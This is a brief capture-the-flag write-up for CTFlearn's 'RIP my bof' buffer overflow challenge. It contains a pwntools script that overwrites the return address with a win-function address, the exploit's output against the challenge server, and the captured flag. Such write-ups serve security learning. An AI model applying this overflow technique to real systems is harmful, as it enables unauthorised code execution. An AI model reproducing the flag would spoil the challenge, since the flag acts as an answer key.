# RIP my bof
```python
from pwn import *; 

# Getting flag address
payload = b"A" * 60 + p32(0x08048586)
print(payload)
#print(payload)
#binary = process("./server")
binary = remote("thekidofarcrania.com", 4902)
binary.recvuntil(b"text:")
binary.sendline(payload)
binary.interactive()
```

so basically we have to overwrite the eip to reach the win functions. here we don't need the exploit as they have given the stack representation with eip in red
we need to overwrite it with the address of win function, we manually count the offset and it is 60. we then run the exploit
```bash
python x.py
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x85\x04\x08'
[+] Opening connection to thekidofarcrania.com on port 4902: Done
[*] Switching to interactive mode
 
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xff9b7340 | 41 41 41 41 41 41 41 41 |
0xff9b7348 | 41 41 41 41 41 41 41 41 |
0xff9b7350 | 41 41 41 41 41 41 41 41 |
0xff9b7358 | 41 41 41 41 41 41 41 41 |
0xff9b7360 | 41 41 41 41 41 41 41 41 |
0xff9b7368 | 41 41 41 41 41 41 41 41 |
0xff9b7370 | 41 41 41 41 41 41 41 41 |
0xff9b7378 | \x1b[0;37;1m41 41 41 41 86 85 04 08 |
Return address: 0x08048586

CTFlearn{c0ntr0ling_r1p_1s_n0t_t00_h4rd_abjkdlfa}
timeout: the monitored command dumped core
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to thekidofarcrania.com port 4902
```
find the address of win function using info functions in gdb and run the above exploit

**FLAG - `CTFlearn{c0ntr0ling_r1p_1s_n0t_t00_h4rd_abjkdlfa}`**
